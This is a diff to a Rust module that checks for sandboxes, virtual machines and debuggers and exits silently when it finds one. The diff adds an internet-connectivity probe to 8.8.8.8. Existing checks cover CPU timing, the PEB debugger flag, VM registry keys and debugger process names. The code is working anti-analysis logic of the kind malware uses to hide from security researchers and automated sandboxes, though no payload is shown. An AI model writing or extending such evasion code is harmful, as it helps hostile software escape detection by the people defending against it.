@@ -1,5 +1,12 @@
 use std::arch::x86_64::_rdtsc;
+use std::net::TcpStream;
+use std::time::Duration;
 use std::{fs, process::exit, time::Instant};
+
+/**
+ * Simple lib of basic functions to detect a sandbox or virtual environment.
+ * Will maybe expand as the project progresses.
+ */
 
 pub fn check_environment() {
     if test_cpu_timing()
@@ -9,9 +16,14 @@ pub fn check_environment() {
         || check_processes()
         || is_debugged()
         || is_vm()
+        || !has_internet_conn()
     {
         exit(0);
     }
+}
+
+fn has_internet_conn() -> bool {
+    TcpStream::connect_timeout(&"8.8.8.8:53".parse().unwrap(), Duration::from_secs(3)).is_ok()
 }
 
 fn test_cpu_timing() -> bool {
@@ -89,7 +101,12 @@ fn detect_vm_hardware() -> bool {
     {
         // check registry for VM indicators
         if let Ok(output) = std::process::Command::new("reg")
-            .args(["query", "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", "/v", "0"])
+            .args([
+                "query",
+                "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum",
+                "/v",
+                "0",
+            ])
             .output()
         {
             let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
@@ -269,7 +286,7 @@ fn is_debugged() -> bool {
             out(reg_byte) being_debugged,
             out("rax") _,
         );
-        
+
         if being_debugged != 0 {
             return true;
         }
@@ -284,17 +301,14 @@ fn is_debugged() -> bool {
             out(reg_byte) being_debugged,
             out("eax") _,
         );
-        
+
         if being_debugged != 0 {
             return true;
         }
     }
 
     // check for common debugger windows
-    if let Ok(output) = std::process::Command::new("tasklist")
-        .args(["/v"])
-        .output()
-    {
+    if let Ok(output) = std::process::Command::new("tasklist").args(["/v"]).output() {
         let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
         let debuggers = ["x64dbg", "x32dbg", "ollydbg", "ida", "windbg", "devenv"];
         for debugger in &debuggers {
